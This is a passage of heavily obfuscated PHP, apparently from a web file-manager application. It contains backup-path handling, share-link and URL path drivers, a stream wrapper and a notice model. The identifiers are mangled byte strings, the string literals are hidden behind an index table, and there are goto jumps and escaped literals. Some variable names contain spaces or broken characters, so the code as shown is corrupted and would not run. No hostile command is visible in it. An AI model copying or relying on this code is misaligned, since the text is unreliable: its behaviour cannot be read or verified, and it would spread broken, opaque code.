($Ş»ÖªİÌ = 0; $Ş»ÖªİÌ < 12; $Ş»ÖªİÌ++) { $ú¢èäÀê[] = date($Ìº»³ö…[849], strtotime("\55{$Ş»ÖªİÌ}\40\155\157\x6e\x74\150\163")); } $ú¢èäÀê = array_unique($ú¢èäÀê); $ŠÃÌÈĞø = Model($Ìº»³ö…[850])->get($Ìº»³ö…[851]); foreach ($£Ëº·ÖÅ as $î®‚†ª) { if (isset($î®‚†ª[$Ìº»³ö…[835]]) && $î®‚†ª[$Ìº»³ö…[835]] == $Ìº»³ö…[91]) { continue; } if (!empty($î®‚†ª[$Ìº»³ö…[32]]) && in_array($î®‚†ª[$Ìº»³ö…[32]], $ú¢èäÀê)) { continue; } $this->model->remove($î®‚†ª[$Ìº»³ö…[486]]); $§ëçåš‡ = $this->backupPath($×÷„—¡», $ŠÃÌÈĞø); IO::remove($§ëçåš‡, !1); } } private function backupPath($Ÿ¹»“Ó, $óçËåò = false) { $Šïéé¯ğ =& $_SERVER[±³—úê]; if (!$óçËåò) { $óçËåò = Model($Šïéé¯ğ[850])->get($Šïéé¯ğ[851]); } $ƒğ²˜òñ = $Ÿ¹»“Ó[$Šïéé¯ğ[32]]; $°™¦Ğú = substr(md5($Šïéé¯ğ[852] . $óçËåò . $ƒğ²˜òñ), 0, 8); return "\173\x69\157\x3a{$Ÿ¹»“Ó[$Šïéé¯ğ[832]]}\175\x2f\x64\x61\164\x61\142\x61\x73\x65\57\142\x61\x63\x6b\x75\160\x2f" . $ƒğ²˜òñ . $Šïéé¯ğ[11] . $°™¦Ğú; } public function db() { $¤³¤”ã =& $_SERVER[±³—úê]; $†”Î†·± = self::get(); if (_get($†”Î†·±, $¤³¤”ã[853], 0) == $¤³¤”ã[91]) { return !0; } $®°åú®É = new BackupDb(); if (!$®°åú®É->index()) { return !1; } self::set(array($¤³¤”ã[853] => 1)); return !0; } public function dbFile() { $¿Éô¡ =& $_SERVER[±³—úê]; $†‰İáıÚ = self::get(); if (_get($†‰İáıÚ, $¿Éô¡[854], 0) == $¿Éô¡[91]) { return !0; } $ê‚Ø‡â = new BackupDbFile(); if (!$ê‚Ø‡â->index()) { return !1; } self::set(array($¿Éô¡[854] => 1)); return !0; } public function file() { $‹­Îâ¼× =& $_SERVER[±³—úê]; $«€Áåñ© = self::get(); if (_get($«€Áåñ©, $‹­Îâ¼×[855], 0) == $‹­Îâ¼×[91]) { return !0; } if ($«€Áåñ©[$‹­Îâ¼×[171]] == $‹­Îâ¼×[856]) { $¬¾ŠÜÊ¿ = new BackupFile(); if (!$¬¾ŠÜÊ¿->index()) { return !1; } } self::set(array($‹­Îâ¼×[855] => 1, $‹­Îâ¼×[830] => 1)); return !0; } } goto e†Û¥„°¯‚; f¶ÖØ«ÉÌ‘: class PathDriverDbShareLink extends PathDriverDB { public function __construct($˜´×ÛÔû) { $this->pathParse = $˜´×ÛÔû; $this->model = Model($_SERVER[±³—úê][1423]); } protected function infoParse($Ø‚ÓØ¦, $í±îÂ½Ş = false, $àè«µèÀ = false) { $Ú±èù˜Ÿ =& $_SERVER[±³—úê]; return Action($Ú±èù˜Ÿ[1258])->sharePathInfo($this->pathParse[$Ú±èù˜Ÿ[87]], !0, $í±îÂ½Ş); } public function listPath($¡ª‚Ö‚±, $ªé¬½æ¡ = false) { $™ƒª¥ùø =& $_SERVER[±³—úê]; $û€§¦“İ = parent::listPath($¡ª‚Ö‚±, $ªé¬½æ¡); if (!$û€§¦“İ) { return $û€§¦“İ; } if (is_array($û€§¦“İ[$™ƒª¥ùø[1431]])) { $û€§¦“İ[$™ƒª¥ùø[1431]] = Action($™ƒª¥ùø[1258])->shareItemInfo($û€§¦“İ[$™ƒª¥ùø[1431]]); } foreach ($û€§¦“İ as $òª×à‘´ => $œÔë›½¡) { if (!in_array($òª×à‘´, array($™ƒª¥ùø[86], $™ƒª¥ùø[85]))) { continue; } foreach ($œÔë›½¡ as $úñ‡óÔ¬ => $ş ÏùÄÉ) { $û€§¦“İ[$òª×à‘´][$úñ‡óÔ¬] = Action($™ƒª¥ùø[1258])->shareItemInfo($ş ÏùÄÉ); } } return $û€§¦“İ; } public function listAll($¸õ„ó°Â) { $…ª”­œ =& $_SERVER[±³—úê]; $ìä±ÒšÍ = IO::info($this->pathParse[$…ª”­œ[87]]); if (!$ìä±ÒšÍ) { return array(); } $ºöÎ·®Ì = $this->model->listAll($¸õ„ó°Â); foreach ($ºöÎ·®Ì as &$û²×Üæó) { $û²×Üæó[$…ª”­œ[90]] = Action($…ª”­œ[1258])->shareItemInfo($û²×Üæó[$…ª”­œ[90]]); } unset($û²×Üæó); return $ºöÎ·®Ì; } } class PathDriverDriverShareItem { public function __construct($£çÃêõ) { $this->pathParse = $£çÃêõ; } public function __call($ê¾Èçàï, $í’–ÂÆÜ) { $ãÅ·¬å€ =& $_SERVER[±³—úê]; if (method_exists($this, $ê¾Èçàï)) { return; } $Ä¹¢û‹ = call_user_func_array(array($ãÅ·¬å€[1432], $ê¾Èçàï), $í’–ÂÆÜ); $—½ßà¹™ = array($ãÅ·¬å€[1433], $ãÅ·¬å€[1434], $ãÅ·¬å€[1435], $ãÅ·¬å€[1436], $ãÅ·¬å€[632], $ãÅ·¬å€[634], $ãÅ·¬å€[1437], $ãÅ·¬å€[110], $ãÅ·¬å€[1438], $ãÅ·¬å€[1439]); if (in_array($ê¾Èçàï, $—½ßà¹™)) { $Ä¹¢û‹ = $this->getPathOuter($Ä¹¢û‹); } return $Ä¹¢û‹; } public function copy($ıË‹ß, $å†®…‰‡, $¶ã†Ù› = false, $©ç·—®½ = false) { return $this->copyMove($ıË‹ß, $å†®…‰‡, $¶ã†Ù›, $_SERVER[±³—úê][632], $©ç·—®½); } public function move($–èˆÌç», $ÇéŠÅ€å, $Ê‘‹ş§» = false, $ëúÜÜû = false) { return $this->copyMove($–èˆÌç», $ÇéŠÅ€å, $Ê‘‹ş§», $_SERVER[±³—úê][634], $ëúÜÜû); } private function copyMove($Ì”‚Àü–, $Î‚ñÔÍõ, $¿Îû¥Ñè, $Ÿéæ½Ôù, $šü÷Ù‰ë = false) { $‚‚·ØÏø =& $_SERVER[±³—úê]; $ãŞ¸õ®í = $Î‚ñÔÍõ; $‘Æí¬‹¤ = IO::driverMake($Î‚ñÔÍõ); if ($‘Æí¬‹¤->pathParse[$‚‚·ØÏø[1234]]) { $Î‚ñÔÍõ = $‘Æí¬‹¤->pathParse[$‚‚·ØÏø[1234]]; } else { $Î‚ñÔÍõ = $ãŞ¸õ®í; } $çø³¿Öã = IO::copyMove($Ì”‚Àü–, $Î‚ñÔÍõ, $¿Îû¥Ñè, $Ÿéæ½Ôù, $šü÷Ù‰ë); $çø³¿Öã = $this->getPathOuter($çø³¿Öã); return $çø³¿Öã; } public function pathThis($º¡¤Ò»£) { return get_path_this($this->pathParse[$_SERVER[±³—úê][87]]); } public function pathFather($‹¹Õüë³) { return get_path_father($this->pathParse[$_SERVER[±³—úê][87]]); } public function iconvSystem($ò¤Ëºı×) { return $ò¤Ëºı×; } protected function infoParse($å¿¾ŞîÍ, $Ã™Ö¸¸” = false) { $Û™¶¬½Í =& $_SERVER[±³—úê]; $˜©óÌ¯® = $this->pathParse[$Û™¶¬½Í[571]][$Û™¶¬½Í[1259]] . $this->pathParse[$Û™¶¬½Í[1252]]; if ($Ã™Ö¸¸”) { $Õåõ½Ì– = IO::infoWithChildren($˜©óÌ¯®); } else { $Õåõ½Ì– = IO::info($˜©óÌ¯®); } $Ôã…½ÇÌ = $this->pathParse[$Û™¶¬½Í[571]]; return Action($Û™¶¬½Í[1430])->_shareItemeParse($Õåõ½Ì–, $Ôã…½ÇÌ); } public function listAll($İŠˆôà) { $¯ÚÜÍÙî =& $_SERVER[±³—úê]; $âüä”† = IO::listAll($İŠˆôà); $éû˜ÕĞ¢ = rtrim($this->pathParse[$¯ÚÜÍÙî[571]][$¯ÚÜÍÙî[1259]], $¯ÚÜÍÙî[8]); foreach ($âüä”† as &$€Ÿ±¼â«) { $€Ÿ±¼â«[$¯ÚÜÍÙî[87]] = $this->pathDriver . $¯ÚÜÍÙî[8] . ltrim(substr($€Ÿ±¼â«[$¯ÚÜÍÙî[87]], strlen($éû˜ÕĞ¢)), $¯ÚÜÍÙî[8]); } unset($€Ÿ±¼â«); return $âüä”†; } public function listAllSimple($ğâ¯Û•š, $Íä£‰²† = false) { $™×øã¯à =& $_SERVER[±³—úê]; $é­ÃäÑˆ = $this->listAll($ğâ¯Û•š); $Ô¹ÅãÓ = $this->pathParse[$™×øã¯à[506]]; if (trim($Ô¹ÅãÓ, $™×øã¯à[8]) == trim(get_path_father($Ô¹ÅãÓ), $™×øã¯à[8])) { $Íä£‰²† = !0; } return IO::init($™×øã¯à[12])->listAllSimpleMake($é­ÃäÑˆ, $Ô¹ÅãÓ, $Íä£‰²†); } public function getPathOuter($É¸øôâ•) { $–Øí¡Ï =& $_SERVER[±³—úê]; $’Ä†Ûâ = KodIO::parse($É¸øôâ•); if ($’Ä†Ûâ[$–Øí¡Ï[33]] == KodIO::KOD_SHARE_ITEM) { return $’Ä†Ûâ[$–Øí¡Ï[87]]; } $›¡É²¨Õ = KodIO::clear($É¸øôâ•); $¹Üù·ñÍ = KodIO::clear($this->pathParse[$–Øí¡Ï[571]][$–Øí¡Ï[1259]]); $À şÎ — = substr($›¡É²¨Õ, strlen($¹Üù·ñÍ)); if (substr($›¡É²¨Õ, 0, strlen($¹Üù·ñÍ)) != $¹Üù·ñÍ) { return !1; } return $this->pathParse[$–Øí¡Ï[1253]] . $–Øí¡Ï[8] . ltrim($À şÎ —, $–Øí¡Ï[8]); } public function getType() { $Ê€€ŸæŸ =& $_SERVER[±³—úê]; $Ñãöà›… = str_replace($Ê€€ŸæŸ[77], $Ê€€ŸæŸ[12], get_class($this)); return strtolower($Ñãöà›…); } public function isOsDriver($¤Ş„Œµ) { return IO::isOsDriver($¤Ş„Œµ); } public function info($ÏîšÄ¶—) { return $this->infoParse($ÏîšÄ¶—); } public function infoAuth($æµÕ¯«›) { return $this->infoParse($æµÕ¯«›); } public function infoWithChildren($Ò¿¦å¨œ) { return $this->infoParse($Ò¿¦å¨œ, !0); } public function infoFull($»‰‹Ù„­) { return $this->infoParse($»‰‹Ù„­); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ŠŠéëÎí) { $this->pathParse = $ŠŠéëÎí; } protected function infoParse($îÈèæêÙ, $«ıÕ‰Øê = false) { $â£Ñ’×° =& $_SERVER[±³—úê]; return Action($â£Ñ’×°[1258])->sharePathInfo($this->pathParse[$â£Ñ’×°[87]], !0, $«ıÕ‰Øê); } public function listPath($”ÃÖ½ü, $ú¯¹ñ” = false) { $“óì¨ò¾ =& $_SERVER[±³—úê]; $§ŸÏÁ¶ü = IO::listPath($”ÃÖ½ü, $ú¯¹ñ”); if (!$§ŸÏÁ¶ü) { return $§ŸÏÁ¶ü; } if (is_array($§ŸÏÁ¶ü[$“óì¨ò¾[1431]])) { $Ç§ÆşÊé = Action($“óì¨ò¾[1440])->parsePathChildren($§ŸÏÁ¶ü[$“óì¨ò¾[1431]], array($“óì¨ò¾[506] => $”ÃÖ½ü)); $§ŸÏÁ¶ü[$“óì¨ò¾[1431]] = Action($“óì¨ò¾[1258])->shareItemInfo($Ç§ÆşÊé); } foreach ($§ŸÏÁ¶ü as $‹¾õµÊ† => $•”Ó„¬“) { if (!in_array($‹¾õµÊ†, array($“óì¨ò¾[86], $“óì¨ò¾[85]))) { continue; } foreach ($•”Ó„¬“ as $ÀŞ€çîŒ => $Ç§ÆşÊé) { $Ç§ÆşÊé = Action($“óì¨ò¾[1440])->parsePathChildren($Ç§ÆşÊé, array($“óì¨ò¾[506] => $”ÃÖ½ü)); $§ŸÏÁ¶ü[$‹¾õµÊ†][$ÀŞ€çîŒ] = Action($“óì¨ò¾[1258])->shareItemInfo($Ç§ÆşÊé); } } return $§ŸÏÁ¶ü; } } goto E¶ó‡éÕ“Æ; E‚¾ñ°“ØÓ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($üÕÒêøÍ = false) { } public function exist($Ñ±åÕÈ“) { $°ıì„×º = $this->info($Ñ±åÕÈ“); return $°ıì„×º[$_SERVER[±³—úê][244]]; } public function isFile($œ›Óûöò) { $äÃ¡öã• = $this->info($œ›Óûöò); return $äÃ¡öã•[$_SERVER[±³—úê][244]]; } public function isFolder($­œ¸‚Ñ”) { return !1; } public function size($á©Ù‰ß) { $×²¸€Î× = $this->info($á©Ù‰ß); return $×²¸€Î×[$_SERVER[±³—úê][79]]; } public function info($Í¾¸á¸Ì) { return $this->infoParse($Í¾¸á¸Ì); } public function infoAuth($šÇ‹Ë…) { return $this->infoParse($šÇ‹Ë…); } public function infoWithChildren($­­±°½†) { return $this->infoParse($­­±°½†); } public function infoFull($Ù´üµñã) { return $this->infoParse($Ù´üµñã); } private function infoParse($é³Ğê¥‹) { $äÇø Å =& $_SERVER[±³—úê]; $Î¹Şâîõ = $this->header($é³Ğê¥‹); if (!$Î¹Şâîõ || !$Î¹Şâîõ[$äÇø Å[830]]) { return !1; } $ã…¬¢©š = _get($Î¹Şâîõ, $äÇø Å[423], 0); $µËÑ¼úÛ = array($äÇø Å[32] => $Î¹Şâîõ[$äÇø Å[32]], $äÇø Å[87] => $é³Ğê¥‹, $äÇø Å[33] => $äÇø Å[242], $äÇø Å[79] => intval($ã…¬¢©š), $äÇø Å[169] => get_path_ext($Î¹Şâîõ[$äÇø Å[32]]), $äÇø Å[1458] => $ã…¬¢©š > 0 && $Î¹Şâîõ[$äÇø Å[1609]], $äÇø Å[1459] => !1); return $µËÑ¼úÛ; } private function header($§«éç¥ô) { $¹ûØöœ =& $_SERVER[±³—úê]; if (isset(self::$_cacheHeader[$§«éç¥ô])) { return self::$_cacheHeader[$§«éç¥ô]; } $¨óğ©Ü¾ = isset($GLOBALS[$¹ûØöœ[1610]]) ? $GLOBALS[$¹ûØöœ[1610]] : !1; $GLOBALS[$¹ûØöœ[1610]] = !0; self::$_cacheHeader[$§«éç¥ô] = url_header($§«éç¥ô); $GLOBALS[$¹ûØöœ[1610]] = $¨óğ©Ü¾; return self::$_cacheHeader[$§«éç¥ô]; } public function hashSimple($î©ßÍëÇ, $Ë³èÄåÈ = false) { $Ş»Ù€Ş’ =& $_SERVER[±³—úê]; $€ÕøÑ = $this->info($î©ßÍëÇ); if (!$€ÕøÑ || !$€ÕøÑ[$Ş»Ù€Ş’[244]]) { return !1; } $ô¼êµí = $€ÕøÑ[$Ş»Ù€Ş’[79]]; $ÉË¼¬Ê = 200; $ô±‰ø§¢ = 50; if ($ô¼êµí <= $ÉË¼¬Ê * $ô±‰ø§¢) { return md5($this->fileSubstr($î©ßÍëÇ, 0, $ô¼êµí)) . $ô¼êµí; } $–­ğİ¤ = intval($ô¼êµí / $ô±‰ø§¢); $¤ÅÃ§‘– = $Ş»Ù€Ş’[12]; $¯˜ş¡Î = timeFloat(); $½å ıõ = 15; for ($™¹¶˜¦ƒ = 0; $™¹¶˜¦ƒ < $ô±‰ø§¢; $™¹¶˜¦ƒ++) { if (timeFloat() - $¯˜ş¡Î > $½å ıõ) { return !1; } $ï¨Õïš = $this->fileSubstr($î©ßÍëÇ, $–­ğİ¤ * $™¹¶˜¦ƒ, $ÉË¼¬Ê); if (!$ï¨Õïš) { return !1; } $¤ÅÃ§‘– .= $ï¨Õïš; } $¤ÅÃ§‘– .= $this->fileSubstr($î©ßÍëÇ, $ô¼êµí - $ÉË¼¬Ê, $ÉË¼¬Ê); return md5($¤ÅÃ§‘–) . $ô¼êµí; } public function getContent($Î¥µ’Ş¶) { return $this->fileSubstr($Î¥µ’Ş¶); } public function fileSubstr($®¢ªƒ£», $áØéÂö = 0, $”™êí¼Û = -1) { $ßë·ÖÊã =& $_SERVER[±³—úê]; $çÊĞÂÚ = $this->info($®¢ªƒ£»); if (!$çÊĞÂÚ || !$çÊĞÂÚ[$ßë·ÖÊã[244]] && $çÊĞÂÚ[$ßë·ÖÊã[79]] > 1024 * 1024 * 10) { return !1; } if ($”™êí¼Û === -1) { $”™êí¼Û = $çÊĞÂÚ[$ßë·ÖÊã[79]]; } if ($”™êí¼Û == 0) { return $ßë·ÖÊã[12]; } $¼¯Œ˜ˆ‡ = array($ßë·ÖÊã[1611] . $áØéÂö . $ßë·ÖÊã[866] . ($áØéÂö + $”™êí¼Û - 1)); $úİ×êŒš = url_request($®¢ªƒ£», $ßë·ÖÊã[1499], !1, $¼¯Œ˜ˆ‡, !1, !1, 30); return $úİ×êŒš[$ßë·ÖÊã[1289]] ? $úİ×êŒš[$ßë·ÖÊã[1289]] : $ßë·ÖÊã[12]; } public function download($Ñô¸Ô¼¡, $¤¬Òø©) { Downloader::start($Ñô¸Ô¼¡, $¤¬Òø©); return $¤¬Òø©; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($“ó”Ã€, $‰ú¨ÌõÇ = '') { $this->info = $this->info($“ó”Ã€); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[±³—úê][87]]; $this->pathOpen = $“ó”Ã€; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$“ó”Ã€])) { self::$_chunkBuffer[$“ó”Ã€] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ì£Œºº§) { $–°Æı®° = $this->fileSubstr($this->pose, $Ì£Œºº§); $this->pose += strlen($–°Æı®°); return $–°Æı®°; } public function stream_tell() { return $this->pose; } public function stream_seek($õâ×Ù•—, $œ¢¾Şî¬) { $§²ö„ß¬ =& $_SERVER[±³—úê]; if ($œ¢¾Şî¬ == SEEK_SET) { $this->pose = $õâ×Ù•—; } else { if ($œ¢¾Şî¬ == SEEK_CUR) { $this->pose += $õâ×Ù•—; } else { if ($œ¢¾Şî¬ == SEEK_END) { $this->pose = $this->info[$§²ö„ß¬[79]] + intval($õâ×Ù•—); } } } if ($õâ×Ù•— < 0) { $this->pose = $this->info[$§²ö„ß¬[79]] + $õâ×Ù•—; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[±³—úê][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($ÆÖ÷•É, $Á½ÎÇ»è) { $×ÇÍÆ‘ =& $_SERVER[±³—úê]; $âøàèÃü = $this->info($ÆÖ÷•É); return array($×ÇÍÆ‘[1402] => 0, $×ÇÍÆ‘[1612] => 0, $×ÇÍÆ‘[16] => 32768 + 511, $×ÇÍÆ‘[1613] => 0, $×ÇÍÆ‘[1614] => 0, $×ÇÍÆ‘[1615] => 0, $×ÇÍÆ‘[1616] => 0, $×ÇÍÆ‘[79] => $âøàèÃü[$×ÇÍÆ‘[79]], $×ÇÍÆ‘[1617] => $âøàèÃü[$×ÇÍÆ‘[1457]], $×ÇÍÆ‘[1574] => $âøàèÃü[$×ÇÍÆ‘[88]], $×ÇÍÆ‘[1573] => $âøàèÃü[$×ÇÍÆ‘[243]], $×ÇÍÆ‘[1618] => 0, $×ÇÍÆ‘[1619] => 0); } static $fileInfo = array(); public function info($­¥¯ÊÈ¾) { $¤ßóğßØ = $_SERVER[±³—úê][1620]; if (isset(self::$fileInfo[$­¥¯ÊÈ¾])) { return self::$fileInfo[$­¥¯ÊÈ¾]; } if (substr($­¥¯ÊÈ¾, 0, strlen($¤ßóğßØ)) != $¤ßóğßØ) { return !1; } self::$fileInfo[$­¥¯ÊÈ¾] = IO::info(substr($­¥¯ÊÈ¾, strlen($¤ßóğßØ))); return self::$fileInfo[$­¥¯ÊÈ¾]; } public static function read($ÛğšÑ˜š, $Ñ‰ÚÛÆ¨, $á¼»û ) { if (!isset(self::$_fopenCache[$ÛğšÑ˜š])) { $½óÄì = new StreamWrapperIO(); $½óÄì->stream_open($ÛğšÑ˜š); self::$_fopenCache[$ÛğšÑ˜š] = $½óÄì; } $½óÄì = self::$_fopenCache[$ÛğšÑ˜š]; return $½óÄì->fileSubstr($Ñ‰ÚÛÆ¨, $á¼»û ); } public static function _read($Ì¼ŒİÑÎ, $“ºÑò°, $–ô›Ëåğ) { $ĞÖÛÃõ– =& $_SERVER[±³—úê]; $¸ªÔÍ­ = fopen($Ì¼ŒİÑÎ, $ĞÖÛÃõ–[1461]); if (!$¸ªÔÍ­) { return $ĞÖÛÃõ–[12]; } $ßëÌı¯İ = 8192; fseek($¸ªÔÍ­, $“ºÑò°, SEEK_SET); $Éâ…ÃØ = $ĞÖÛÃõ–[12]; $æ÷¶°™ = 0; while ($æ÷¶°™ < $–ô›Ëåğ) { $ÅÙ„Ïå³ = min($ßëÌı¯İ, $–ô›Ëåğ - $æ÷¶°™); $Éâ…ÃØ .= fread($¸ªÔÍ­, $ÅÙ„Ïå³); $æ÷¶°™ += $ÅÙ„Ïå³; } fclose($¸ªÔÍ­); return $Éâ…ÃØ; } public function fileSubstr($±ö¾‚¹¦, $Ö†¦ş†ó) { $Ì¶Û‡äŸ =& $_SERVER[±³—úê]; $Ì¸ùÎüÀ = $this->info[$Ì¶Û‡äŸ[79]]; $¸¹Ÿµ¦ = $±ö¾‚¹¦; $¶á’·ê = $Ö†¦ş†ó; if ($±ö¾‚¹¦ < 0) { $±ö¾‚¹¦ = $Ì¸ùÎüÀ + $±ö¾‚¹¦; } if ($Ö†¦ş†ó === !1) { $Ö†¦ş†ó = $Ì¸ùÎüÀ - $±ö¾‚¹¦; } if ($±ö¾‚¹¦ + $Ö†¦ş†ó > $Ì¸ùÎüÀ) { $Ö†¦ş†ó = $Ì¸ùÎüÀ - $±ö¾‚¹¦; } if ($Ö†¦ş†ó <= 0) { return $Ì¶Û‡äŸ[12]; } if ($±ö¾‚¹¦ < 0 || $±ö¾‚¹¦ >= $Ì¸ùÎüÀ || $Ö†¦ş†ó <= 0 || $Ö†¦ş†ó > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\x69\x6c\x65\122\145\141\x64\x20\145\162\162\157\x72\x21\40\163\x74\x61\162\164\75{$±ö¾‚¹¦}\73\154\x65\x6e\147\164\150\x3d{$Ö†¦ş†ó}\73\40\163\x69\172\x65\x3d{$Ì¸ùÎüÀ}\73"); } $—»ÚÑšÎ = 64 * 1024; $Ä›¶ç›ç =& self::$_chunkBuffer[$this->path]; if (!$Ä›¶ç›ç) { $Ä›¶ç›ç = array(); } $ƒÃì½ŠŞ = 0; $œíØÖÁÑ = 0; $óê—ŒÑ˜ = $Ì¶Û‡äŸ[12]; foreach ($Ä›¶ç›ç as $ƒÃì½ŠŞ => $óê—ŒÑ˜) { $ƒÃì½ŠŞ = intval($ƒÃì½ŠŞ); $œíØÖÁÑ = $ƒÃì½ŠŞ + strlen($óê—ŒÑ˜); if ($±ö¾‚¹¦ >= $œíØÖÁÑ) { continue; } if ($±ö¾‚¹¦ >= $ƒÃì½ŠŞ && $±ö¾‚¹¦ + $Ö†¦ş†ó <= $œíØÖÁÑ) { return substr($óê—ŒÑ˜, $±ö¾‚¹¦ - $ƒÃì½ŠŞ, $Ö†¦ş†ó); } break; } if (count($Ä›¶ç›ç) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($Ì¶Û‡äŸ[1621], $Ì¶Û‡äŸ[1622] . count($Ä›¶ç›ç) . "\73\163\164\x61\162\164\x3d{$±ö¾‚¹¦}\x2c\154\145\x6e\147\164\x68\75{$Ö†¦ş†ó}\x3b\160\x6f\163\145\x3a{$ƒÃì½ŠŞ}\176{$œíØÖÁÑ}"); throw new Exception($Ì¶Û‡äŸ[1623]); } $¨ˆ˜³Õ¶ = intval($±ö¾‚¹¦ / $—»ÚÑšÎ) * $—»ÚÑšÎ; $Åôø—Ñ = ceil(($±ö¾‚¹¦ + $Ö†¦ş†ó) / $—»ÚÑšÎ) * $—»ÚÑšÎ - $¨ˆ˜³Õ¶; $Ë¶½±÷Å = IO::fileSubstr($this->path, $¨ˆ˜³Õ¶, $Åôø—Ñ); $Ä›¶ç›ç[$¨ˆ˜³Õ¶ . $Ì¶Û‡äŸ[12]] = $Ë¶½±÷Å; ksort($Ä›¶ç›ç); $‡“Ïå”€ = substr($Ë¶½±÷Å, $±ö¾‚¹¦ - $¨ˆ˜³Õ¶, $Ö†¦ş†ó); return $‡“Ïå”€; } private function log($Î‘™Ÿüâ, $Ê¾Â Ã½) { $ƒ‚Êûı =& $_SERVER[±³—úê]; $¿ÌÛ³«” = timeFloat() - $this->timeStart; write_log(sprintf($ƒ‚Êûı[1624], $Î‘™Ÿüâ, $this->info[$ƒ‚Êûı[32]], $¿ÌÛ³«”, $Ê¾Â Ã½), $ƒ‚Êûı[1266]); } } class Message { function __construct() { } public function send($÷È£üø = '', $õİ´ÈÔĞ = array(), $Ë…Û×¢¤ = "\164\x65\x78\x74") { $ÊùÖœî =& $_SERVER[±³—úê]; $““ã›« = array($ÊùÖœî[33] => $ÊùÖœî[1215], $ÊùÖœî[171] => $÷È£üø); if (in_array($Ë…Û×¢¤, array($ÊùÖœî[1215], $ÊùÖœî[1625]))) { $““ã›«[$ÊùÖœî[33]] = $Ë…Û×¢¤; } $õİ´ÈÔĞ = array($ÊùÖœî[589] => isset($õİ´ÈÔĞ[$ÊùÖœî[589]]) ? $õİ´ÈÔĞ[$ÊùÖœî[589]] : $ÊùÖœî[12], $ÊùÖœî[676] => isset($õİ´ÈÔĞ[$ÊùÖœî[676]]) ? $õİ´ÈÔĞ[$ÊùÖœî[676]] : $ÊùÖœî[12]); if (empty($÷È£üø) || empty($õİ´ÈÔĞ[$ÊùÖœî[589]]) && empty($õİ´ÈÔĞ[$ÊùÖœî[676]])) { return !1; } $ëÚŒ„ˆâ = array($ÊùÖœî[1554] => $““ã›«, $ÊùÖœî[1626] => $õİ´ÈÔĞ); Hook::trigger($ÊùÖœî[1627], $ëÚŒ„ˆâ); } } goto b¢¯ÃÛ‚; f‡œ‚çˆÑ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x6e\x6f\x74\x69\143\x65\114\x69\163\164"; public $field = array("\x6e\141\x6d\145", "\x63\x6f\156\x74\x65\x6e\164", "\x61\x75\x74\x68", "\155\157\144\x65", "\x74\151\x6d\145", "\164\x79\160\145", "\x6c\x65\x76\x65\154", "\145\156\x61\142\x6c\145", "\x73\157\162\x74"); public function listData($Å–Ï¨Í¦ = false, $‡±Ü”İ‡ = "\163\157\162\x74", $®ĞáƒŠ­ = false) { return parent::listData($Å–Ï¨Í¦, $‡±Ü”İ‡, $®ĞáƒŠ­); } public function add($äış¯ØÛ) { $Ïëúğã‡ =& $_SERVER[±³—úê]; $Ğº«¡‰¸ = time(); if ($äış¯ØÛ[$Ïëúğã‡[16]] == $Ïëúğã‡[2446]) { $Ğº«¡‰¸ = strtotime($äış¯ØÛ[$Ïëúğã‡[206]]); } $äış¯ØÛ[$Ïëúğã‡[206]] = $Ğº«¡‰¸; return parent::insert($äış¯ØÛ); } public function update($ÁÅîÈê™, $‹‡†ûö™) { $éõî¥”Ú =& $_SERVER[±³—úê]; $ãŸŠ¯”² = $this->listData($ÁÅîÈê™); if (!$ãŸŠ¯”²) { return !1; } $ú³–Ù‘¯ = time(); if ($‹‡†ûö™[$éõî¥”Ú[16]] == $éõî¥”Ú[2446]) { $ú³–Ù‘¯ = strtotime($‹‡†ûö™[$éõî¥”Ú[206]]); } $‹‡†ûö™[$éõî¥”Ú[206]] = $ú³–Ù‘¯; return parent::update($ÁÅîÈê™, $‹‡†ûö™); } public function remove($İì‘‚š) { $¬÷Ü·›ö = $this->listData($İì‘‚š); if (!$¬÷Ü·›ö || $¬÷Ü·›ö[$_SERVER[±³—úê][191]]) { return !1; } return parent::remove($İì‘‚š); } public function sort($ºğÃéÆ, $²’Ëó“¯) { return parent::update($ºğÃéÆ, $²’Ëó“¯); } public function enable($šäŒØˆ”, $ÕßşÒËğ) { return parent::update($šäŒØˆ”, array($_SERVER[±³—úê][2447] => $ÕßşÒËğ)); } private function initUserOption() { $ìÕ°Ú =& $_SERVER[±³—úê]; $this->optionType = $ìÕ°Ú[2448]; $this->modelType = $ìÕ°Ú[2449]; $this->field = array($ìÕ°Ú[2450], $ìÕ°Ú[32], $ìÕ°Ú[206], $ìÕ°Ú[33], $ìÕ°Ú[2451], $ìÕ°Ú[830], $ìÕ°Ú[238]); } public function userNoticeGet($ÏìòĞĞ° = false) { $this->initUserOption(); return parent::listData($ÏìòĞĞ°, $_SERVER[±³—úê][486], !0); } public function userNoticeAdd($–÷õº«š) { $ÁÏÅ´öÍ =& $_SERVER[±³—úê]; $this->initUserOption(); $¯Á¡–Ó± = $this->findByKey($ÁÏÅ´öÍ[2450], $–÷õº«š[$ÁÏÅ´öÍ[486]]); if ($¯Á¡–Ó±) { return !0; } $ä€†­¼ê = array($ÁÏÅ´öÍ[2450] => $–÷õº«š[$ÁÏÅ´öÍ[486]], $ÁÏÅ´öÍ[32] => $–÷õº«š[$ÁÏÅ´öÍ[32]], $ÁÏÅ´öÍ[206] => $–÷õº«š[$ÁÏÅ´öÍ[206]], $ÁÏÅ´öÍ[33] => isset($–÷õº«š[$ÁÏÅ´öÍ[33]]) ? $–÷õº«š[$ÁÏÅ´öÍ[33]] : 1, $ÁÏÅ´öÍ[2451] => isset($–÷õº«š[$ÁÏÅ´öÍ[2451]]) ? $–÷õº«š[$ÁÏÅ´öÍ[2451]] : 0, $ÁÏÅ´öÍ[830] => 0, $ÁÏÅ´öÍ[238] => 0); return parent::insert($ä€†­¼ê); } public function userNoticeEdit($†Ø„ûóÖ, 